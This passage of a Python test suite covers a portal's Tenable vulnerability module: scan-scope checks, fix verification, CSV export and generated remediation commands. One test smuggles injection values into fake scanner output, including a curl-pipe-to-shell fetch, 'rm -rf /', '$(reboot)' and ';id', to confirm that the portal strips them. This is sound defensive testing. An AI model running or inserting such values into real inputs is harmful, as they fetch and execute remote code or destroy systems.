        self.assertFalse(ok("10.248.1.250-10.248.2.5"))   # crosses the edge
        self.assertFalse(ok("mgmt01.example.local"))
        self.assertFalse(ok("2001:db8::1"))
        self.assertFalse(ok(""))   # no target list (target groups, tags)
        self.assertFalse(ok("10.248.0.9-10.248.0.1"))   # backwards: not a range, not checkable
        self.assertEqual(self.scope.other_targets({"targets": "10.248.0.5", "tag_targets": ["t"], "target_groups": []}), ["asset tags"])
        self.assertEqual(self.scope.other_targets({"targets": "10.248.0.5", "file_targets": "", "asset_lists": None}), [])
        self.assertIn("also targets target groups", self.scope.check_scan("S", "10.248.0.5", cfg, other=["target groups"])["reason"])
        self.assertIn("E has no management networks", self.scope.check_scan("E", "10.253.128.1", cfg)["reason"])
        self.assertIn("not the scanner of any site", self.scope.check_scan("", "10.248.0.1", cfg, "x")["reason"])
        many = self.scope.check_scan("S", ",".join(f"8.8.8.{n}" for n in range(15)), cfg)
        self.assertIn("and 5 more", many["reason"])
        self.assertEqual(self.scope.check_ip("S", "10.248.1.9", cfg), "")
        for bad in ("10.247.128.1", "10.248.0.0/24", "10.248.0.1,10.248.0.2", "2001:db8::1", "", "host"):
            self.assertTrue(self.scope.check_ip("S", bad, cfg), bad)
        self.assertTrue(self.scope.check_ip("E", "10.248.0.1", cfg))

    def test_sites_yml_proposal_from_the_targets_of_the_scans(self):
        net = self.scope.ipaddress.ip_network
        cfg = {"DCB": {"scanner": "tenable-scanner-dcb", "groups": [], "networks": [], "problems": []},
               "DCA": {"scanner": "sc-dca", "groups": [], "networks": [net("10.245.1.0/24")], "problems": []}}
        items = [{"site": "DCB", "scanner": "tenable-scanner-dcb", "targets": "172.26.32.0/24"},
                 {"site": "DCB", "scanner": "tenable-scanner-dcb", "targets": "172.26.252.0/24, 172.26.112.0/23"},
                 {"site": "DCB", "scanner": "tenable-scanner-dcb", "targets": "172.26.253.5, 8.8.8.8, mgmt.local"},
                 {"site": "DCA", "scanner": "sc-dca", "targets": "10.245.1.0/25"},   # inside its networks already
                 {"site": "", "scanner": "tenable-scanner-dcc", "targets": "10.243.128.0/24"}]
        p = self.scope.proposals(items, cfg)
        self.assertEqual(p["DCB"], {"scanner": "tenable-scanner-dcb", "scans": 3,
                                    "networks": ["172.26.32.0/24", "172.26.112.0/23", "172.26.252.0/24", "172.26.253.5/32"]})
        self.assertNotIn("DCA", p)   # public addresses and host names are never proposed; covered scans need nothing
        self.assertEqual(p[""], {"scanners": {"tenable-scanner-dcc": ""}})   # no site DCC in this sites.yml: no guess
        cfg["DCC"] = {"scanner": "", "groups": [], "networks": [], "problems": []}
        self.assertEqual(self.scope.proposals(items, cfg)[""], {"scanners": {"tenable-scanner-dcc": "DCC"}})
        # on the Scans page for administrators only; the launch guard never reads it
        self.do_sync()
        self.assertIsInstance(self.get("/vulns/api/scans")["proposals"], dict)
        self.assertEqual((self.get("/vulns/api/scans", "viewer")["proposals"], self.get("/vulns/api/scans", "scanop")["sites_file"]), ({}, ""))

    def test_verify_fix(self):
        self.do_sync()
        r = self.post("/vulns/api/scans/12/verify", {"ip": "10.245.1.41", "confirm": "10.245.1.41"}, "scanop")
        self.assertEqual(r["ip"], "10.245.1.41")
        self.assertEqual(self.launches()[-1]["body"], {"alt_targets": ["10.245.1.41"]})
        event = self.events("nessus.verify")[0]
        self.assertIn("for 10.245.1.41 only (Verify fix, 4 open findings)", event["detail"])
        self.assertIn("is running", self.post("/vulns/api/scans/12/verify", {"ip": "10.245.0.25", "confirm": "10.245.0.25"},
                                              "scanop", 400)["error"])
        # the scan ends, the next sync (after round 2 of the mock) shows the worst finding of that host fixed
        self.mock.state.complete_all()
        self.do_sync()
        self.assertEqual(self.finding("10.245.1.41", 182896)["state"], "FIXED")
        refused = (
            (13, "11.6.148.5", "outside the management networks of DCA"),   # outside the networks
            (12, "10.248.0.11", "outside the management networks of DCA"),    # a host of another site
            (12, "10.245.0.99", "not a host with findings of DCA"),            # inside, but no finding
            (12, "10.245.1.0/24", "Enter one IPv4 address"),
            (12, "10.245.1.40, 10.245.1.41", "Enter one IPv4 address"),
            (12, "fe80::1", "Enter one IPv4 address"),
            (17, "192.168.252.10", "LAB has no management networks"))
        before = len(self.launches())
        for sid, ip, text in refused:
            self.assertIn(text, self.post(f"/vulns/api/scans/{sid}/verify", {"ip": ip, "confirm": ip}, "portaladmin", 400)["error"], ip)
        self.assertEqual(len(self.launches()), before)

    # ---- Tenable API client ----
    def test_retry_after_429(self):
        waits = []
        with mock.patch.object(self.tenable, "_sleep", waits.append):
            self.mock.state.fail_next = [429]
            c = self.tenable.Client(ACCESS, SECRET)
            self.assertEqual(c.session()["username"], "svc-portal-api@example.com")
            self.assertEqual(waits, [1])
            self.mock.state.fail_next = [503, 503, 503]
            with self.assertRaises(self.tenable.TenableError) as e:
                c.scanners()
            self.assertIn("HTTP 503", str(e.exception))
            self.assertEqual(len(waits), 3)
            self.mock.state.fail_next = [500]   # a POST that may have been handled is not sent again
            n = len(self.mock.state.requests)
            with self.assertRaises(self.tenable.TenableError):
                c.stop(11)
            self.assertEqual(len(self.mock.state.requests), n + 1)
            self.mock.state.fail_next = [429, 429]   # the sync goes on after 429s
            self.assertEqual(self.do_sync()["status"], "ok")
        self.assertNotIn(SECRET, repr(c))

    def test_proxy(self):
        with mock.patch.dict(os.environ, {"VULNS_PROXY": self.mock.url, "VULNS_URL": "http://tenable.invalid"}), \
                mock.patch("urllib.request.proxy_bypass", return_value=False):
            c = self.tenable.Client(ACCESS, SECRET)
            self.assertEqual(c.session()["username"], "svc-portal-api@example.com")   # tenable.invalid only resolves at the proxy
            self.assertGreaterEqual(self.mock.state.proxied, 1)
            self.assertIn("through", self.nessus.test_credential({}, ACCESS, SECRET))
        with mock.patch.dict(os.environ, {"VULNS_PROXY": "http://user:pw@127.0.0.1:1"}), \
                mock.patch("urllib.request.proxy_bypass", return_value=False):
            with self.assertRaises(self.tenable.TenableError) as e:
                self.tenable.Client(ACCESS, SECRET).session()
            self.assertIn("not reachable through the proxy 127.0.0.1:1", str(e.exception))
            self.assertNotIn("pw", str(e.exception))

    # ---- CSV ----
    def test_csv_export(self):
        self.do_sync()
        r = self.get("/vulns/export/findings.csv?site=DCA&severity=high", "viewer")
        self.assertIn('filename="Nessus_Findings_DCA_', r.headers["Content-Disposition"])
        rows = list(csv.reader(io.StringIO(r.get_data(as_text=True).lstrip("﻿"))))
        self.assertEqual(rows[0][:4], ["Site", "IP", "Host name", "Plugin ID"])
        self.assertEqual(len(rows) - 1, 4)
        self.assertEqual({x[0] for x in rows[1:]}, {"DCA"})
        self.assertEqual({x[6] for x in rows[1:]}, {"High", "Critical"})
        self.assertEqual(self.findings._cell("=cmd"), "'=cmd")
        self.assertEqual(self.app.test_client().get("/vulns/export/findings.csv").status_code, 401)   # not signed in
        self.get("/vulns/export/findings.csv", "nomod", 403)
        everything = self.get("/vulns/export/findings.csv?state=all").get_data(as_text=True)
        self.assertIn("Other", everything)

    # ---- How to fix it (remedy.py) ----
    def finding_of(self, plugin, ip="10.248.0.11", os_name="", output=None, port=0, **extra):
        """A finding row as findings.py gives it, from the mock's plugin data (or an output of the test)."""
        name, family, severity, cvss3, vpr, cves, synopsis, solution = mock_tenable.PLUGINS[plugin]
        row = {"id": 1, "ipv4": ip, "hostname": mock_tenable.HOSTS.get(ip, ""), "plugin_id": plugin, "plugin_name": name,
               "plugin_family": family, "severity": severity, "cves": list(cves), "port": port, "protocol": "TCP", "service": "",
               "output": mock_tenable.output_of(ip, plugin, port) if output is None else output, "solution": solution,
               "synopsis": synopsis, "os": os_name or mock_tenable.OS.get(ip, ""), "see_also": mock_tenable.PLUGIN_META.get(plugin, (0,) * 6)[4]}
        row.update(extra)
        return row

    def commands(self, plan):
        return [c for step in plan["steps"] for c in step["commands"]]

    def assert_only_finding_values(self, f, plan):
        """Every address in the commands is the finding's own; every dotted number (a version) comes from the finding."""
        source = " ".join(str(f.get(k) or "") for k in ("output", "plugin_name", "os", "ipv4"))
        for c in self.commands(plan):
            for ip in re.findall(r"(?<![\w.])\d{1,3}(?:\.\d{1,3}){3}(?![\w.])", c):
                self.assertEqual(ip, f["ipv4"], c)
            for number in re.findall(r"(?<![\w.:-])\d+(?:\.\d+)+(?![\w.])", c):
                self.assertIn(number, source, c)
            for word in ("acmecorp", "intranet", "172.26.", "172.25.", "172.24.", "dcbvm", "dca02"):
                self.assertNotIn(word, c.lower())   # nothing of the VA runbooks' real devices

    def test_fix_ubuntu_packages(self):
        out = mock_tenable.OUTPUTS[190596] + ("\n  - Installed package : openssl_3.0.2-0ubuntu1.12\n"
                                              "  - Fixed package     : openssl_3.0.2-0ubuntu1.14\n")
        f = self.finding_of(190596, output=out)
        plan = self.remedy.plan(f)
        self.assertEqual((plan["kind"], plan["platform"]["id"]), ("packages", "debian"))
        self.assertEqual(plan["versions"][0], {"item": "linux-image-5.15.0-94-generic", "installed": "5.15.0-91.101", "fixed": "5.15.0-94.104"})
        self.assertIn({"item": "openssl", "installed": "3.0.2-0ubuntu1.12", "fixed": "3.0.2-0ubuntu1.14"}, plan["versions"])
        cmds = self.commands(plan)
        self.assertIn("sudo apt-get install --only-upgrade linux-libc-dev openssl", cmds)
        self.assertIn("sudo apt-get install linux-image-5.15.0-94-generic linux-modules-5.15.0-94-generic", cmds)   # new kernel ABI
        self.assertIn("cat /var/run/reboot-required /var/run/reboot-required.pkgs 2>/dev/null", cmds)
        self.assertIn("WITHOUT the virtual IP first", plan["steps"][2]["text"])
        self.assertIn("USN-6608-1", plan["title"])
        self.assertTrue(plan["title"].endswith("and reboot"))
        self.assertEqual(plan["notes"][-2:], [self.remedy.NOTE_APPROVAL, self.remedy.NOTE_VERIFY])
        self.assertIn("linux-image-5.15.0-94-generic 5.15.0-94.104", plan["fixed_version"])
        self.assert_only_finding_values(f, plan)

    def test_fix_rhel_packages(self):
        f = self.finding_of(189585, ip="10.248.0.21")
        plan = self.remedy.plan(f)
        self.assertEqual((plan["kind"], plan["platform"]["id"]), ("packages", "rhel"))
        self.assertEqual(plan["versions"][0], {"item": "kernel", "installed": "4.18.0-477.10.1.el8_8", "fixed": "4.18.0-513.18.1.el8_9"})
        cmds = self.commands(plan)
        self.assertIn("rpm -q kernel kernel-core kernel-modules bpftool", cmds)
        self.assertIn("sudo dnf update kernel kernel-core kernel-modules bpftool", cmds)
        self.assertIn("sudo needs-restarting -r", cmds)
        old = self.remedy.plan(dict(f, os="CentOS Linux 7.9"))   # release 7: yum
        self.assertIn("sudo yum update kernel kernel-core kernel-modules bpftool", self.commands(old))
        self.assert_only_finding_values(f, plan)

    def test_fix_cisco_ios_xe_advisory(self):
        f = self.finding_of(182896, ip="10.245.1.41", port=443)
        plan = self.remedy.plan(f)
        self.assertEqual((plan["kind"], plan["platform"]["id"]), ("cisco-advisory", "iosxe"))
        self.assertEqual(plan["versions"], [{"item": "Cisco IOS XE Software", "installed": "17.3.4a", "fixed": "17.3.8a"}])
        self.assertIn("Upgrade Cisco IOS XE Software from 17.3.4a to 17.3.8a or later", " ".join(s["text"] for s in plan["steps"]))
        cmds = self.commands(plan)
        self.assertIn(" no ip http server", cmds)   # the Web UI off until (and after) the upgrade
        self.assertIn("show install summary", cmds)
        self.assertIn("Cisco bug ID: CSCwh87343.", plan["notes"])
        self.assertTrue(any("cisco-sa-iosxe-webui-privesc" in u for u in plan["links"]))
        self.assertEqual(plan["fixed_version"], "17.3.8a")
        self.assert_only_finding_values(f, plan)

    def test_fix_windows_kb(self):
        f = self.finding_of(187833, ip="10.243.128.26", port=445)
        plan = self.remedy.plan(f)
        self.assertEqual((plan["kind"], plan["platform"]["id"]), ("windows-update", "windows"))
        self.assertEqual(plan["versions"], [{"item": r"C:\Windows\system32\ntoskrnl.exe", "installed": "10.0.17763.5206",
                                             "fixed": "10.0.17763.5329"}])
        cmds = self.commands(plan)
        self.assertIn("Get-HotFix -Id KB5034127 -ErrorAction SilentlyContinue", cmds)
        self.assertIn("Restart-Computer", cmds)
        self.assertIn("WSUS", plan["steps"][1]["text"])
        self.assertEqual(plan["fixed_version"], "KB5034127")
        self.assert_only_finding_values(f, plan)

    def test_fix_ssh_algorithms(self):
        f = self.finding_of(70658, port=22)   # Ubuntu
        plan = self.remedy.plan(f)
        self.assertEqual((plan["kind"], plan["platform"]["id"]), ("ssh", "debian"))
        texts = " ".join(s["text"] for s in plan["steps"])
        self.assertIn("Tenable found: 3des-cbc, aes128-cbc, aes256-cbc.", texts)
        cmds = self.commands(plan)
        self.assertIn("sudo tee /etc/ssh/sshd_config.d/50-strong-algorithms.conf >/dev/null <<'EOF'", cmds)
        self.assertIn("sudo sshd -t && (sudo systemctl reload ssh 2>/dev/null || sudo systemctl reload sshd)", cmds)
        self.assertIn("ssh -o Ciphers=3des-cbc -p 22 <account>@10.248.0.11", cmds)
        self.assertFalse(any("cbc" in c for c in cmds if c.startswith("Ciphers ")))
        kex = self.remedy.plan(self.finding_of(153953, ip="10.248.0.21", port=22))
        self.assertIn("ssh -o KexAlgorithms=diffie-hellman-group-exchange-sha1 -p 22 <account>@10.248.0.21", self.commands(kex))
        terrapin = self.remedy.plan(self.finding_of(187315, port=22))
        self.assertIn("Close Terrapin", terrapin["title"])
        self.assertIn("sudo apt-get install --only-upgrade openssh-server openssh-client", self.commands(terrapin))
        self.assertIn("chacha20-poly1305@openssh.com", terrapin["fix"])
        for os_name, pid, needle in (("Cisco IOS XE 17.9.4", "iosxe", " ip ssh server algorithm encryption aes256-gcm aes128-gcm aes256-ctr aes192-ctr aes128-ctr"),
                                     ("Cisco IOS 15.2(7)E8", "ios", " ip ssh server algorithm encryption aes256-ctr aes192-ctr aes128-ctr"),
                                     ("Cisco NX-OS 9.3(8)", "nxos", " ssh ciphers aes256-gcm@openssh.com aes128-gcm@openssh.com aes256-ctr aes128-ctr"),
                                     ("Cisco IOS XR 7.3.2", "iosxr", " ssh server algorithms cipher aes256-gcm@openssh.com aes128-gcm@openssh.com aes256-ctr aes192-ctr aes128-ctr")):
            other = self.remedy.plan(self.finding_of(70658, os_name=os_name, port=22))
            self.assertEqual(other["platform"]["id"], pid)
            self.assertIn(needle, self.commands(other), os_name)
            self.assert_only_finding_values(f, other)
        apic = self.remedy.plan(self.finding_of(153953, ip="10.245.0.25", port=22))
        self.assertEqual(apic["platform"]["id"], "apic")
        self.assertIn("Management Access", apic["steps"][0]["text"])
        self.assertIn("diffie-hellman-group1-sha1", apic["steps"][0]["text"])
        self.assertEqual(apic["steps"][0]["commands"], [])   # GUI steps
        self.assert_only_finding_values(f, plan)

    def test_fix_tls(self):
        f = self.finding_of(104743, ip="10.248.0.21", port=443)   # RHEL
        plan = self.remedy.plan(f)
        self.assertEqual((plan["kind"], plan["platform"]["id"]), ("tls", "rhel"))
        self.assertEqual(plan["versions"], [{"item": "TLS 1.0", "installed": "enabled", "fixed": "disabled (TLS 1.2 or later only)"}])
        cmds = self.commands(plan)
        self.assertIn("sudo ss -ltnp 'sport = :443'", cmds)
        self.assertIn("ssl_protocols TLSv1.2 TLSv1.3;", cmds)
        self.assertIn("sudo apachectl configtest && sudo systemctl reload httpd", cmds)
        self.assertIn("openssl s_client -connect 10.248.0.21:443 -tls1 </dev/null", cmds)
        found = {name: self.finding_of(plugin, ip=ip, port=port) for name, plugin, ip, port in (
            ("win", 104743, "10.243.128.26", 3389), ("ios", 104743, "10.245.1.41", 443), ("sweet", 42873, "10.243.128.26", 3389),
            ("cert", 57582, "10.248.1.15", 443), ("apic", 104743, "10.245.0.25", 49153))}
        plans = {name: self.remedy.plan(x) for name, x in found.items()}
        self.assertTrue(any("Protocols\\TLS 1.0\\Server" in c for c in self.commands(plans["win"])))
        self.assertIn("Restart-Computer", self.commands(plans["win"]))
        self.assertIn(" no ip http secure-server", self.commands(plans["ios"]))
        self.assertIn("DES-CBC3-SHA, ECDHE-RSA-DES-CBC3-SHA", plans["sweet"]["fix"])
        self.assertTrue(any("Triple DES 168" in c for c in self.commands(plans["sweet"])))
        self.assertIn({"item": "Certificate RSA key", "installed": "1024 bits", "fixed": "2048 bits or more"}, plans["cert"]["versions"])
        self.assertIn("TAC", plans["apic"]["steps"][0]["text"])   # a Cisco service of the APIC: no user setting
        self.assert_only_finding_values(f, plan)
        for name, p in plans.items():
            self.assert_only_finding_values(found[name], p)

    def test_fix_telnet_and_versions_and_fallback(self):
        telnet = self.remedy.plan(self.finding_of(42263, ip="10.245.1.41", port=23))
        self.assertEqual((telnet["kind"], telnet["platform"]["id"]), ("cleartext", "iosxe"))
        self.assertIn("  transport input ssh", self.commands(telnet))
        self.assertIn("AFTER a new SSH login", telnet["steps"][0]["text"])
        self.assertIn("timeout 5 bash -c '</dev/tcp/10.245.1.41/23' && echo still open || echo closed", self.commands(telnet))
        linux = self.remedy.plan(self.finding_of(42263, ip="10.248.0.11", port=23))
        self.assertIn("sudo systemctl disable --now telnet.socket", self.commands(linux))
        version = self.remedy.plan(self.finding_of(201194, port=22))
        self.assertEqual((version["kind"], version["title"]), ("version", "Upgrade OpenSSH to 9.8p1 / 9.8"))
        self.assertEqual(version["versions"][0]["installed"], "8.9p1")
        self.assertIn("backport", version["notes"][0])
        generic = self.remedy.plan(self.finding_of(201194, output="\n  Path              : /opt/app/bin/app\n  Installed version : 2.4.1\n"
                                                                  "  Fixed version     : 2.4.58\n", port=443))
        self.assertIn("dpkg -S '/opt/app/bin/app'", self.commands(generic))
        self.assertEqual(generic["fixed_version"], "2.4.58")
        fallback = self.remedy.plan(self.finding_of(41028, ip="10.248.1.15", port=161))
        self.assertEqual(fallback["kind"], "generic")
        self.assertEqual(fallback["steps"][0]["text"], mock_tenable.PLUGINS[41028][7])
        self.assertEqual(fallback["tenable"], mock_tenable.PLUGINS[41028][7])
        esxi = self.remedy.plan(self.finding_of(70658, os_name="VMware ESXi 7.0.3", port=22))
        self.assertEqual([s["text"][:21] for s in esxi["steps"]], ["Not from this portal:"])
        for p, f in ((telnet, {"ipv4": "10.245.1.41"}), (linux, {"ipv4": "10.248.0.11"}), (version, {"ipv4": "10.248.0.11"})):
            self.assert_only_finding_values(dict(f, output=""), p)

    def test_fix_commands_carry_only_safe_values(self):
        evil = ("\n  - Installed package : openssl_1.0;curl${IFS}x.sh|sh\n  - Fixed package     : openssl_1.1;rm -rf /\n"
                "\n  - Installed package : zlib1g_1:1.2.11\n  - Fixed package     : zlib1g_1:1.2.13\n")
        plan = self.remedy.plan(self.finding_of(190596, output=evil))
        cmds = " ".join(self.commands(plan))
        self.assertNotIn(";", cmds.replace("2>/dev/null", ""))
        self.assertNotIn("rm -rf", cmds)
        self.assertIn("zlib1g", cmds)
        ssh = self.remedy.plan(self.finding_of(70658, output="\n  3des-cbc\n  $(reboot)\n  aes128-cbc;id\n", port=22))
        self.assertNotIn("reboot)", " ".join(self.commands(ssh)))
        self.assertNotIn(";id", " ".join(self.commands(ssh)))
        self.assertIn("Tenable found: 3des-cbc, aes128-cbc.", " ".join(s["text"] for s in ssh["steps"]))   # names only
        # every finding of the mock: addresses and versions of the finding only
        for (ip, plugin, port, _proto), item in mock_tenable.State().findings.items():
            if item["severity"] == "info":
                continue
            f = self.finding_of(plugin, ip=ip, port=port)
            self.assert_only_finding_values(f, self.remedy.plan(f))

    def test_fix_in_api_and_csv(self):
        self.do_sync()
        h = self.get("/vulns/api/hosts/10.248.0.11", "viewer")
        self.assertEqual(h["os"], "Linux Kernel 5.15.0-91-generic on Ubuntu 22.04")
        usn = next(i for i in h["items"] if i["plugin_id"] == 190596)
        self.assertEqual(usn["plan"]["kind"], "packages")
        self.assertEqual((usn["has_patch"], usn["exploit_available"], usn["plugin_type"]), (True, False, "local"))
        self.assertTrue(usn["patch_date"].endswith("Z"))
        self.assertEqual(usn["see_also"], ["https://ubuntu.com/security/notices/USN-6608-1"])
        self.assertEqual(usn["plan"]["facts"]["has_patch"], True)
        one = self.get(f"/vulns/api/findings/{usn['id']}", "viewer")
        self.assertEqual(one["finding"]["plan"]["title"], usn["plan"]["title"])
        self.assertEqual(one["shell"], [])   # no Shell for this account
        self.get("/vulns/api/findings/999999", "viewer", 400)
        self.get(f"/vulns/api/findings/{usn['id']}", "nomod", 403)
        r = self.get("/vulns/export/findings.csv?site=DCB&severity=high&q=USN-6608-1", "viewer")
        rows = list(csv.reader(io.StringIO(r.get_data(as_text=True).lstrip("\ufeff"))))
        self.assertEqual(rows[0][-2:], ["Fixed version", "Fix"])
        self.assertEqual(len(rows), 2)
        self.assertIn("linux-image-5.15.0-94-generic 5.15.0-94.104", rows[1][-2])
        self.assertTrue(rows[1][-1].startswith("Update linux-image-5.15.0-94-generic"))
        self.assertTrue(rows[1][-1].endswith("; reboot"))

    def test_fix_shell_link(self):
        self.do_sync()
        want = [{"site": "DCA", "category": "network", "name": "dca-oob-sw-02", "address": "10.245.1.41", "problem": ""}]
        self.assertEqual(self.get("/vulns/api/hosts/10.245.1.41", "sheller")["shell"], want)
        self.assertEqual(self.get("/vulns/api/hosts/10.245.1.41")["shell"], want)   # administrators open every host
        self.assertEqual(self.get("/vulns/api/hosts/10.245.1.41", "sheller2")["shell"], [])   # Shell, but not this host
        self.assertEqual(self.get("/vulns/api/hosts/10.245.1.41", "scanop")["shell"], [])     # no Shell
        self.assertEqual(self.get("/vulns/api/hosts/10.245.0.25")["shell"], [])               # no Shell host has the address
        fid = next(i["id"] for i in self.get("/vulns/api/hosts/10.245.1.41")["items"] if i["plugin_id"] == 42263)
        self.assertEqual(self.get(f"/vulns/api/findings/{fid}", "sheller")["shell"], want)
        with mock.patch.dict(sys.modules):   # the Web Terminal module not loaded: no link, nothing breaks
            del sys.modules["modules.shell"]
            self.assertEqual(self.get("/vulns/api/hosts/10.245.1.41")["shell"], [])

    def test_fix_columns_migration(self):
        old = os.path.join(TMP, "old.db")
        with contextlib.closing(sqlite3.connect(old)) as db, db:   # the table of the first version of the module
            db.execute("""CREATE TABLE nessus_findings (
                id INTEGER PRIMARY KEY AUTOINCREMENT, asset_uuid TEXT NOT NULL, plugin_id INTEGER NOT NULL,
                port INTEGER NOT NULL DEFAULT 0, protocol TEXT NOT NULL DEFAULT '', service TEXT NOT NULL DEFAULT '',
                ipv4 TEXT NOT NULL DEFAULT '', hostname TEXT NOT NULL DEFAULT '', site TEXT NOT NULL DEFAULT '',
                plugin_name TEXT NOT NULL DEFAULT '', plugin_family TEXT NOT NULL DEFAULT '', severity TEXT NOT NULL DEFAULT '',
                severity_rank INTEGER NOT NULL DEFAULT 0, cvss3 REAL, vpr REAL, cves TEXT NOT NULL DEFAULT '',
                state TEXT NOT NULL, first_found TEXT, last_found TEXT, last_fixed TEXT, synopsis TEXT, solution TEXT,
                output TEXT, state_changed TEXT, updated TEXT, UNIQUE (asset_uuid, plugin_id, port, protocol))""")
            db.execute("INSERT INTO nessus_findings (asset_uuid, plugin_id, ipv4, state) VALUES ('u', 1, '10.248.0.9', 'OPEN')")
        with mock.patch.object(self.findings.settings, "DB_PATH", old):
            self.findings.init()
            self.findings.init()   # again: nothing to add
            with contextlib.closing(sqlite3.connect(old)) as db:
                columns = {r[1] for r in db.execute("PRAGMA table_info(nessus_findings)")}
                self.assertTrue({"see_also", "has_patch", "patch_date", "exploit", "description", "plugin_type", "os", "fqdn",
                                 "scan_uuid", "schedule_uuid", "scan_started", "scanner", "site_via"} <= columns)
                self.assertEqual(db.execute("SELECT COUNT(*) FROM nessus_findings").fetchone()[0], 1)
            row = self.findings.get(1)
            self.assertEqual((row["see_also"], row["has_patch"], row["os"]), ([], None, ""))
            self.assertEqual(self.findings.with_plan(row)["plan"]["kind"], "generic")
            # the rows kept before get the new columns at the next sync: it reads the whole window again, once
            self.assertTrue(self.findings.full_sync_needed())
            sid = self.findings.sync_start("test", "manual", "")
            self.findings.sync_finish(sid, "ok", {})
            self.assertAlmostEqual(self.sync.since_epoch(), time.time() - 90 * 86400, delta=120)
            self.findings.full_sync_done()
            self.assertEqual(self.sync.since_epoch(), self.sync._epoch(self.findings.last_sync("ok")["started"]) - 3600)

    # ---- the secret key ----
    def test_zz_secret_never_leaks(self):
        """After every other test: no answer, log line, activity entry or table of the module holds the secret key."""
        self.do_sync()
        self.post("/vulns/api/scans/13/launch", {"confirm": "x"}, status=400)
        self.PORTAL.store.set_credential("tenable", ACCESS, self.PORTAL.vault.encrypt(SECRET[::-1]), "test")
        self.do_sync()
        self.post("/vulns/api/sync")
        self.sync.wait(20)
        for text in self.answers:
            self.assertNotIn(SECRET, text)
            self.assertNotIn(SECRET[::-1], text)
        for line in self.capture.lines:
            self.assertNotIn(SECRET, line)
        with contextlib.closing(sqlite3.connect(os.environ["OPS_DB"])) as db:
            for table in ("portal_events", "nessus_findings", "nessus_syncs", "nessus_trend", "nessus_meta"):
                dump = "\n".join(repr(tuple(r)) for r in db.execute(f"SELECT * FROM {table}"))
                self.assertNotIn(SECRET, dump, table)
        with open(os.environ["OPS_DB"], "rb") as f:
            self.assertNotIn(SECRET.encode(), f.read())   # the credential itself is stored encrypted


if __name__ == "__main__":
    unittest.main()
